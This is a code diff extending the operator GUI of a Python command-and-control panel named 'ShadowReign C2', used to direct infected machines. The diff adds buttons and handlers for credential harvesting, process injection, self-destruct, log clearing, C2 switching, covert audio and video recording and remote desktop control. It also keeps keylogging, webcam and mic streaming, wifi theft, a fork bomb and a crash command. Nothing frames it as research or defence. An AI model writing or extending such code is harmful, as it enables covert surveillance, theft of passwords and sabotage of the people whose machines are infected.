@@ -16,10 +16,11 @@ class ShadowReignGUI:
         self.root.title("ShadowReign C2 - The Boss")
         self.root.geometry("1200x800")
         self.root.configure(bg="#1e1e1e")
-        self.HOST = "0.0.0.0"  # Listen on all interfaces
+        self.HOST = "0.0.0.0"
         self.PORT = 5251
         self.KEY = b"ShadowReignBoss!"
         self.clients = {}
+        self.clients_lock = threading.Lock()
         self.selected_client = None
         self.home_dir = os.path.expanduser("~")
         self.setup_ui()
@@ -66,6 +67,8 @@ class ShadowReignGUI:
             "Pranks": self.create_pranks_tab,
             "Shell": self.create_shell_tab,
             "Live": self.create_live_tab,
+            "Advanced": self.create_advanced_tab,
+            "Remote": self.create_remote_tab,
         }
         for name, func in tabs.items():
             tab = tk.Frame(self.notebook, bg="#1e1e1e")
@@ -111,9 +114,11 @@ class ShadowReignGUI:
         while True:
             try:
                 client_socket, addr = self.server.accept()
-                self.clients[client_id] = (client_socket, {"ip": addr[0], "os": "Unknown", "status": "Online", "anti_vm": False})
+                with self.clients_lock:
+                    self.clients[client_id] = (client_socket, {"ip": addr[0], "os": "Unknown", "status": "Online", "anti_vm": False})
                 threading.Thread(target=self.handle_client, args=(client_id,), daemon=True).start()
                 client_id += 1
+                self.queue_gui_update()
             except Exception:
                 break
 
@@ -123,66 +128,78 @@ class ShadowReignGUI:
             try:
                 length_bytes = sock.recv(4)
                 if not length_bytes:
-                    self.clients[client_id][1]["status"] = "Offline"
-                    # Send reconnect command before closing
-                    try:
-                        self.send_message(sock, json.dumps({"command": "reconnect"}))
-                    except Exception:
-                        pass
-                    self.update_client_list()
+                    with self.clients_lock:
+                        self.clients[client_id][1]["status"] = "Offline"
+                    self.queue_gui_update()
                     break
                 length = int.from_bytes(length_bytes, byteorder='big')
                 data = sock.recv(length).decode()
                 response = json.loads(self.decrypt(data))
-                self.clients[client_id][1].update(response)
-                self.update_client_list()
-
-                if "keylogs" in response:
-                    self.keylog_display.delete(1.0, tk.END)
-                    self.keylog_display.insert(tk.END, response["keylogs"])
-                    self.save_to_file("keylogs.txt", response["keylogs"])
-                elif "files" in response:
-                    self.file_display.delete(1.0, tk.END)
-                    self.file_display.insert(tk.END, "\n".join(response["files"]))
-                elif "file" in response:
-                    self.save_to_file("downloaded_file", base64.b64decode(response["file"]), binary=True)
-                elif "screenshot" in response:
-                    self.display_image(response["screenshot"], "screenshot.png")
-                elif "video" in response:
-                    self.save_to_file("screen_recording.avi", base64.b64decode(response["video"]), binary=True)
-                elif "webcam" in response:
-                    self.display_image(response["webcam"], "webcam_snap.jpg")
-                elif "output" in response or "hashes" in response:
-                    self.shell_output.delete(1.0, tk.END)
-                    self.shell_output.insert(tk.END, response.get("output", response.get("hashes", "")))
-                    self.save_to_file("shell_output.txt", response.get("output", response.get("hashes", "")))
-                elif "status" in response:
-                    messagebox.showinfo("Status", response["status"])
-                elif "stream_frame" in response:
-                    self.save_to_file(f"screen_stream_{int(time.time())}.jpg", base64.b64decode(response["stream_frame"]), binary=True)
-                elif "webcam_frame" in response:
-                    self.save_to_file(f"webcam_stream_{int(time.time())}.jpg", base64.b64decode(response["webcam_frame"]), binary=True)
-                elif "mic_chunk" in response:
-                    self.save_to_file(f"mic_stream_{int(time.time())}.wav", base64.b64decode(response["mic_chunk"]), binary=True)
-                elif "error" in response:
-                    messagebox.showerror("Error", response["error"])
-                elif "steal_wifi" in response:
-                    self.shell_output.delete(1.0, tk.END)
-                    self.shell_output.insert(tk.END, "\n".join([f"{k}: {v}" for k, v in response.items() if k != "command"]))
-                    self.save_to_file("wifi_data.txt", "\n".join([f"{k}: {v}" for k, v in response.items() if k != "command"]))
+                with self.clients_lock:
+                    self.clients[client_id][1].update(response)
+                self.process_response(client_id, response)
             except Exception:
-                self.clients[client_id][1]["status"] = "Offline"
-                try:
-                    self.send_message(sock, json.dumps({"command": "reconnect"}))
-                except Exception:
-                    pass
-                self.update_client_list()
+                with self.clients_lock:
+                    self.clients[client_id][1]["status"] = "Offline"
+                self.queue_gui_update()
                 break
 
+    def process_response(self, client_id, response):
+        if "keylogs" in response:
+            self.root.after(0, lambda: self.update_text(self.keylog_display, response["keylogs"]))
+            self.save_to_file("keylogs.txt", response["keylogs"])
+        elif "files" in response:
+            self.root.after(0, lambda: self.update_text(self.file_display, "\n".join(response["files"])))
+        elif "file" in response:
+            self.save_to_file("downloaded_file", base64.b64decode(response["file"]), binary=True)
+        elif "screenshot" in response:
+            self.root.after(0, lambda: self.display_image(response["screenshot"], "screenshot.png"))
+        elif "video" in response:
+            self.save_to_file("screen_recording.avi", base64.b64decode(response["video"]), binary=True)
+        elif "webcam" in response:
+            self.root.after(0, lambda: self.display_image(response["webcam"], "webcam_snap.jpg"))
+        elif "output" in response or "hashes" in response:
+            self.root.after(0, lambda: self.update_text(self.shell_output, response.get("output", response.get("hashes", ""))))
+            self.save_to_file("shell_output.txt", response.get("output", response.get("hashes", "")))
+        elif "status" in response:
+            self.root.after(0, lambda: messagebox.showinfo("Status", response["status"]))
+        elif "stream_frame" in response:
+            self.save_to_file(f"screen_stream_{int(time.time())}.jpg", base64.b64decode(response["stream_frame"]), binary=True)
+        elif "webcam_frame" in response:
+            self.save_to_file(f"webcam_stream_{int(time.time())}.jpg", base64.b64decode(response["webcam_frame"]), binary=True)
+        elif "mic_chunk" in response:
+            self.save_to_file(f"mic_stream_{int(time.time())}.wav", base64.b64decode(response["mic_chunk"]), binary=True)
+        elif "error" in response:
+            self.root.after(0, lambda: messagebox.showerror("Error", response["error"]))
+        elif "steal_wifi" in response:
+            wifi_text = "\n".join([f"{k}: {v}" for k, v in response.items() if k != "command"])
+            self.root.after(0, lambda: self.update_text(self.shell_output, wifi_text))
+            self.save_to_file("wifi_data.txt", wifi_text)
+        elif "remote_frame" in response:
+            self.root.after(0, lambda: self.display_image(response["remote_frame"], "remote_desktop.jpg"))
+        elif "creds" in response:
+            creds_text = "\n".join([f"{url}: {info['user']} - {info['pass']}" for url, info in response["creds"].items()])
+            self.root.after(0, lambda: self.update_text(self.shell_output, creds_text))
+            self.save_to_file("credentials.txt", creds_text)
+        elif "audio_rec" in response:
+            self.save_to_file("audio_rec.wav", base64.b64decode(response["audio_rec"]), binary=True)
+        elif "video_rec" in response:
+            self.save_to_file("video_rec.avi", base64.b64decode(response["video_rec"]), binary=True)
+        self.queue_gui_update()
+
+    def queue_gui_update(self):
+        self.root.after(0, self.update_client_list)
+
     def update_client_list(self):
+        with self.clients_lock:
+            current_clients = dict(self.clients)
         self.client_list.delete(*self.client_list.get_children())
-        for cid, (sock, info) in self.clients.items():
+        for cid, (sock, info) in current_clients.items():
             self.client_list.insert("", "end", values=(cid, info["ip"], info["os"], info["status"], "On" if info["anti_vm"] else "Off"))
+
+    def update_text(self, widget, text):
+        widget.delete(1.0, tk.END)
+        widget.insert(tk.END, text)
 
     def save_to_file(self, filename, data, binary=False):
         try:
@@ -201,6 +218,8 @@ class ShadowReignGUI:
             photo = ImageTk.PhotoImage(img)
             self.media_display.configure(image=photo)
             self.media_display.image = photo
+            self.remote_display.configure(image=photo)
+            self.remote_display.image = photo
             self.save_to_file(filename, img_data, binary=True)
         except Exception:
             pass
@@ -211,10 +230,11 @@ class ShadowReignGUI:
             self.selected_client = int(self.client_list.item(selected[0])["values"][0])
 
     def send_command(self, command, data=None):
-        if self.selected_client is None or self.clients[self.selected_client][1]["status"] != "Online":
+        if self.selected_client is None or self.clients.get(self.selected_client, [None])[1]["status"] != "Online":
             messagebox.showerror("Error", "No active client selected!")
             return
-        sock = self.clients[self.selected_client][0]
+        with self.clients_lock:
+            sock = self.clients[self.selected_client][0]
         try:
             self.send_message(sock, json.dumps({"command": command, "data": data}))
         except Exception as e:
@@ -267,7 +287,8 @@ class ShadowReignGUI:
 
     def toggle_anti_vm(self):
         if self.selected_client is not None:
-            current_state = self.clients[self.selected_client][1]["anti_vm"]
+            with self.clients_lock:
+                current_state = self.clients[self.selected_client][1]["anti_vm"]
             self.send_command("toggle_anti_vm", not current_state)
 
     def create_pranks_tab(self, tab):
@@ -275,6 +296,12 @@ class ShadowReignGUI:
         tk.Button(tab, text="Jumpscare", command=lambda: self.send_command("jumpscare"), bg="#ff4444", fg="white").pack(pady=5)
         tk.Button(tab, text="Crash System", command=lambda: self.send_command("crash_system"), bg="#ff4444", fg="white").pack(pady=5)
         tk.Button(tab, text="Fork Bomb", command=lambda: self.send_command("fork_bomb"), bg="#ff4444", fg="white").pack(pady=5)
+        tk.Button(tab, text="Fake Alert", command=self.fake_alert, bg="#ff4444", fg="white").pack(pady=5)
+
+    def fake_alert(self):
+        message = tk.simpledialog.askstring("Fake Alert", "Enter alert message:")
+        if message:
+            self.send_command("fake_alert", {"message": message})
 
     def create_shell_tab(self, tab):
         tk.Label(tab, text="Shell", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
@@ -290,6 +317,74 @@ class ShadowReignGUI:
         tk.Button(tab, text="Stream Webcam", command=lambda: self.send_command("stream_webcam"), bg="#ff4444", fg="white").pack(pady=5)
         tk.Button(tab, text="Stream Mic", command=lambda: self.send_command("stream_mic"), bg="#ff4444", fg="white").pack(pady=5)
         tk.Button(tab, text="Stop Streams", command=lambda: self.send_command("stop_stream"), bg="#ff4444", fg="white").pack(pady=5)
+        tk.Button(tab, text="Record A/V", command=self.record_av, bg="#ff4444", fg="white").pack(pady=5)
+
+    def record_av(self):
+        duration = tk.simpledialog.askinteger("Record A/V", "Enter duration (seconds):")
+        type_ = tk.simpledialog.askstring("Record A/V", "Enter type (audio/video):")
+        if duration and type_ in ["audio", "video"]:
+            self.send_command("record_av", {"duration": duration, "type": type_})
+
+    def create_advanced_tab(self, tab):
+        tk.Label(tab, text="Advanced Features", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
+        tk.Button(tab, text="Inject Process", command=self.inject_process, bg="#ff4444", fg="white").pack(pady=5)
+        tk.Button(tab, text="Queue Command", command=self.queue_command, bg="#ff4444", fg="white").pack(pady=5)
+        tk.Button(tab, text="Self-Destruct", command=lambda: self.send_command("self_destruct"), bg="#ff4444", fg="white").pack(pady=5)
+        tk.Button(tab, text="Harvest Credentials", command=lambda: self.send_command("harvest_creds"), bg="#ff4444", fg="white").pack(pady=5)
+        tk.Button(tab, text="Spoof Info", command=self.spoof_info, bg="#ff4444", fg="white").pack(pady=5)
+        tk.Button(tab, text="Clear Logs", command=lambda: self.send_command("clear_logs"), bg="#ff4444", fg="white").pack(pady=5)
+        tk.Button(tab, text="Switch C2", command=self.switch_c2, bg="#ff4444", fg="white").pack(pady=5)
+
+    def inject_process(self):
+        process_name = tk.simpledialog.askstring("Inject Process", "Enter process name (e.g., explorer.exe):")
+        if process_name:
+            self.send_command("inject", process_name)
+
+    def queue_command(self):
+        cmd = tk.simpledialog.askstring("Queue Command", "Enter command to queue:")
+        if cmd:
+            data = tk.simpledialog.askstring("Queue Command", "Enter data (optional, JSON format):")
+            self.send_command("queue_command", {"command": cmd, "data": json.loads(data) if data else None})
+
+    def spoof_info(self):
+        hostname = tk.simpledialog.askstring("Spoof Info", "Enter fake hostname:")
+        ip = tk.simpledialog.askstring("Spoof Info", "Enter fake IP:")
+        if hostname and ip:
+            self.send_command("spoof_info", {"hostname": hostname, "ip": ip})
+
+    def switch_c2(self):
+        c2_list = tk.simpledialog.askstring("Switch C2", "Enter C2 list (e.g., [('ip1', port1), ('ip2', port2)]):")
+        if c2_list:
+            self.send_command("switch_c2", {"c2_list": eval(c2_list)})
+
+    def create_remote_tab(self, tab):
+        tk.Label(tab, text="Remote Desktop", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
+        tk.Button(tab, text="Start Remote", command=lambda: self.send_command("remote_desktop", {"action": "start"}), bg="#ff4444", fg="white").pack(pady=5)
+        tk.Button(tab, text="Stop Remote", command=lambda: self.send_command("stop_stream"), bg="#ff4444", fg="white").pack(pady=5)
+        self.remote_x = tk.Entry(tab, width=10, bg="#333333", fg="white")
+        self.remote_x.pack(pady=5, side=tk.LEFT)
+        self.remote_y = tk.Entry(tab, width=10, bg="#333333", fg="white")
+        self.remote_y.pack(pady=5, side=tk.LEFT)
+        tk.Button(tab, text="Move Mouse", command=self.move_mouse, bg="#ff4444", fg="white").pack(pady=5, side=tk.LEFT)
+        tk.Button(tab, text="Click Mouse", command=lambda: self.move_mouse(click=True), bg="#ff4444", fg="white").pack(pady=5, side=tk.LEFT)
+        self.remote_key = tk.Entry(tab, width=10, bg="#333333", fg="white")
+        self.remote_key.pack(pady=5, side=tk.LEFT)
+        tk.Button(tab, text="Press Key", command=self.press_key, bg="#ff4444", fg="white").pack(pady=5, side=tk.LEFT)
+        self.remote_display = tk.Label(tab, bg="#333333")
+        self.remote_display.pack(pady=10)
+
+    def move_mouse(self, click=False):
+        try:
+            x = int(self.remote_x.get())
+            y = int(self.remote_y.get())
+            self.send_command("remote_desktop", {"action": "mouse", "x": x, "y": y, "click": click})
+        except ValueError:
+            messagebox.showerror("Error", "Invalid coordinates")
+
+    def press_key(self):
+        key = self.remote_key.get()
+        if key:
+            self.send_command("remote_desktop", {"action": "key", "key": key})
 
 if __name__ == "__main__":
     ShadowReignGUI()
